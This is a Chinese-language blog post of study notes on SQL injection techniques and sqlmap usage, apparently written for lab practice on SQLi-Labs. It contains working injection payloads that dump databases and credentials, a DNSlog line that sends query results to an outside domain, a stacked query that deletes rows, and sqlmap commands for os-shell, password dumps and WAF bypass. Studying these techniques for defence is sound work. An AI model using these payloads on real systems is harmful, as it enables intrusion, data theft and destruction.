---
title: "SQL 注入"
published: 2026-09-13T22:46:00+08:00
description: "联合查询、报错、布尔/时间盲注、宽字节与堆叠注入等注入手法，附 sqlmap 用法。"
image: ""
tags:
  - 安全笔记
  - Web安全
category: 技术文章
draft: false
lang: zh-CN
pinned: false
comment: true
---

# sqli

## 什么是sqli

sql注入，攻击者构造并提交sql代码片段作为参数拼接到后端查询

+ ### 原理

  - 由于后端对前端输入参数缺乏正确处理，导致攻击者构造并提交sql代码片段作为参数拼接到后端查询

+ ### 分类

  - 有回显、无回显
  - 数字型、字符型
  - URL、表单、头部注入

+ ### 有什么危害

  - 条件满足的情况下：
    1. 从技术上来说，未授权增删改查数据库内容，包括拖库，删库，读写系统文件，执行命令等等
    2. 从影响上来说，盗窃系统机密数据，能篡改网站页面，接管服务器，篡改系统交易数据等等

+ ### 利用条件

  - information_schema

  - 联合查询

  - 文件读写

    * 2个前提：

    1. 知道绝对路径
    2. `secure_File_priv` 开关需要是打开状态

    * 读文件`select load_file("路径和文件名");`load_file()需要打开一个读写文件的配置secure-file-priv ；load data infile 和 load data local infile ，不受secure-file-priv 的限制后两者和SQLi关系不大load data infile ：可以导入文件中的表数据到表中LOAD DATA INFILE '/home/zhuxu/1.txt' INTO TABLE tmp_loaddata FIELDS TERMINATED BY ',';load data local infile ;与load data infile作用类似
    * 写文件

```sql
SELECT "12\n3" INTO OUTFILE "c:/123.txt";
SELECT "1230\nabc" INTO DUMPFILE "c:/123.txt";
```

注：dumpfile可以处理非可见字符。要使用联合查询写文件，不能使用and或者or拼接写文件 **secure_file_priv**默认是NULL，可以通过my.conf文件mysqld一栏里进行配置，配置完成后，重启才会生效。select @@global.secure_file_priv;各个选项值有什么用

            1. 设置为空，那么所有路径均可进行导入导出
            2. 设置为一个目录名字，那么只允许在该路径下导入导出
            3. 设置为null（默认），那么禁止所有导入导出
    - 报错注入
    - dnslog

+ ### 如何挖掘

  - 找到一个动态网站（.php?xx= / .jsp?xx=/ .asp?xx=）
  - 伪静态 [http://xxx.com/news/id/1.html](http://xxx.com/news/id/1.html) 可能等于 [http://xxx.com/news.php?id=1](http://xxx.com/news.php?id=1)
  - 罗列潜在注入点
  - 依次对注入点进行注入尝试
    1. 首先给不同参数，观察返回的结果
    2. 猜测后端的sql查询语句，以及注入点sql语句在模板中的位置
    3. 如果有回显，考虑联合查询
    4. 如果没回显，但是有报错，考虑报错注入
    5. 如果都没有，考虑布尔盲注和时间盲注
    6. 如果以上都不行，考虑换个模块的注入点
+ ### 修复思路

  - 使用预编译技术
  - 使用成熟的防注入框架

## 联合查询注入

### 思路

1. 找到注入点
2. 猜测后端查询语句
3. 判断类型
4. 判断列数
5. 判断回显位
6. 查库名
7. 查表名和字段名
8. 查数据

### 步骤

1. 判断注入点判断哪些地方会和后端数据库进行交互，则有可能成为注入点
2. 猜测查询语句

```sql
select * from t_xx where col_xx = 1;
```

3. 判断类型参数改成2-1，看查询结果是否对应1的结果

```plain
http://xxx.xxx.xxx.xxx:xxx/sql/xxx/index.php?id=2-1
```

能计算就是数字型，否则就是字符型

4. 判断列数用order by判断列数

```sql
select * from t_xx where col_xx = 1 order by 10%23;
```

抽出参数

```sql
1 order by 10%23
```

注入参数，拼接到url后面用二分法判断列数，直到一个尽可能大的列数不报错，就能判断列数就是他了

5. 判断回显位

```sql
select * from t_xx where col_xx = 1 union select 1,2,3%23;
```

查出记录可能有多条，但是前端网页可能不能全部显示，要想办法让左边查不出结果，给不存在的条件，如id改成-1后续就在回显位查出数据并显示

6. 查库名

```sql
SELECT * FROM t_xx WHERE col_xx = -1 union select 1,2,database()%23;
```

7. 查表名

```sql
http://172.16.116.75:13980/SQLi-Labs/Less-1/index.php?id=-1 union SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema="security";%23
```

8. 查列名

```sql
http://172.16.116.75:13980/SQLi-Labs/Less-1/index.php?id=-1 union SELECT
1,2,group_concat(column_name) FROM information_schema.columns WHERE
table_schema="security" and table_name="users";%23
```

9. 查数据

```sql
http://172.16.116.75:13980/SQLi-Labs/Less-1/index.php?id=-1 union SELECT
1,2,group_concat(concat_ws("=>", id,username,password)) FROM users;%23
```

## 报错注入

### 如何进行报错注入

1. 判断注入点
2. 猜测查询语句

```sql
select * from t_xx where c_xx = '1' LIMIT 0,1
```

3. 判断闭合符'/"/)
4. 看有无报错，能否通过报错信息带出查询的内容
5. 如果报错payload需要联合查询则需要判断列数，如果不需要联合查询则不需要判断列数

## 布尔盲注

无回显，无报错用盲注

and 1有结果

and 0无结果

无结果=》不成立

有结果=》成立

关键函数：length()、substr()、ascii()

[http://172.16.116.75:13980/sqli-labs/Less-8/?id=1](http://172.16.116.75:13980/sqli-labs/Less-8/?id=1)' and ascii(substr(database(),2,1))>10%23

## 时间盲注

基础：if(,,)，sleep()，and、or、benchmark()、

无回显无报错且响应内容无差异，则只能用延时盲注

原理：构造布尔表达式，根据结果不同反推字符

思路步骤：

1. and sleep()反推闭合符
2. 构造布尔表达式，反推字符

## dnslog注入

[https://dnslog.ink/](https://dnslog.ink/)

加快注入速度

dnslog服务

1. 获取一个dnslog平台的子域名
2. SELECT load_file(concat("\\",(select database()),".9d238749.digimg.store\aa"))
3. 将上述语句注入到注入点，然后到dnslog平台上获取数据

## 宽字节注入

基础：西欧字母符号，通过1个字节来表示。东亚字符通过至少两个字节来表示。GBK编码用两个字节来表示中文区字符。其编码范围：8140－FEFE（高字节从81到FE，低字节从40到FE）。

+ 条件
  - 后台代码使用GBK编码连接数据库的时候
+ 原理
  - 编码转换存在着单字符被合并的情形
  - 反斜杠对应ascii编码5c，是单字节的
  - 在5c前再加入一个单字节字符dd（范围可以是81到FE之间），就成了dd5c
  - 而当后端使用GBK编码的时候，会将合理的两个单字节ANSCII字符解析成一个双字节的GBK编码字符。

## 堆叠注入

多注入1个语句，在注入的两个语句中尝试使用分号分隔即可。

例子，谨慎参考

```sql
192.168.68.131/SQLi-Labs/Less-38/?id = 1';delete from users where id=1%23
```

危害巨大，可改库

## like注入

猜测搜索功能点的查询语句

 select * from news where content like '%搜索的内容%';

注入payload

```sql
搜索的内容%' order by 10#
```

## http头部注入

sqli-labs-18

模板：insert into t_xx values('xx', '666', 'ipxxx')

payload：xx',EXTRACTVALUE('anything',concat(0x7e, DATABASE())),'xx

如果猜测到后端有SQL查询，而且会带入http请求头中的字段内容，那么该功能点可能存在SQL注入。

头部注入通常用在后端记录日志入库的场景。

## sqlmap

+ ### 有哪些功能？能够对多种不同数据库进行不同类型的注入，比如：

  - 对不同数据库管理系统进行注入
  - 查库表列和数据的功能
  - 注入读写文件
  - 注入执行系统命令等
+ 各个选项什么意思-h 获取帮助-hh 获取详细帮助--is-dba 判断当前用户是否dba--privileges 查看权限--current-user 查看当前用户--passwords 查看密码--os-shell 获取os-shell--level n ，n指探测等级，数值越高，等级越高，默认为1。在不确定哪个payload或参数为注入点时，为了保证全面性，建议使用更高的level值，2级会探测cookie，3级会探测user-agent、refer头-v n ，参数指定回显信息的复杂度，n属于[0~6]，3可以查看payload--batch 全部采用默认选择
+ ### 需要注意什么

  1. 不要使用拖库的选项
  2. 如果对手工没有绝对的自信，就不要注入有修改功能的注入点
+ ### 典型使用步骤：

  - URL注入
    1. 寻找注入点截取访问链接，得到注入点：[http://xxxx](http://xxxx)
    2. 查询库名打开cmd，切换目录到sqlmap执行命令：python sqlmap.py -u "[http://xxxx](http://xxxx)" --current-db
    3. 指定库名查表名python sqlmap.py -u "[http://xxxx](http://xxxx)" -D 库名 --tables
    4. 指定库名、表名查列名python sqlmap.py -u "注入点" -D 库名 -T 表名 --columns
    5. 获取sql-shellpython sqlmap.py -u "注入点" --sql-shell获得sql-shell提示符
    6. 查记录前面步骤获取到表结构后，在sql-shell提示符后面输入SQL语句查询记录：

```sql
select username, password from t_admin;
```

获得管理员账号记录：账号：adminmd5（密码）：xxxx

        7. 反差密码访问cmd5.com，输入md5（密码）查询，得知密码为：xxx
    - 表单注入 --forms表框注入，不需要任何操作，自动测试注入sqlmap.py -u （url） --forms --batch --current-db
    - post注入--data “var1=parm1&var2=parm2"
    - 通过请求注入 -r "r.txt"r.txt中保存的是http请求包sqlmap.py -r 1.txt --current-db
    - cookie注入

```sql
sqlmap.py -u "xxx.xxx.xxx" --level 2 --cookie "xx=xx"
```

    - 伪静态注入url后面加*（星号）-u "[http://host/app/index/id/1](http://host/app/index/id/1)*"
    - 请求延时--url="[http://127.0.0.1/Index/view/id/40.html](http://127.0.0.1/Index/view/id/40.html)" --delay=2 --url="[http://127.0.0.1/Index/view/id/40.html](http://127.0.0.1/Index/view/id/40.html)" --safe-freq=2

+ ### 如何绕waf

  - 通过--tamper选项绕过：--tamper space2comment.py常见绕waf的tamper：space2comment、space2dash、between、–random-agent设置延时请求间隔秒：--delay=2 定期访问安全页面：--safe-url, --safe-freq
+ sqlmap拿shell--os-shell前提：必须知道网站根目录的绝对路径
+ mysql原理：写文件mssql原理：xp_cmdshell
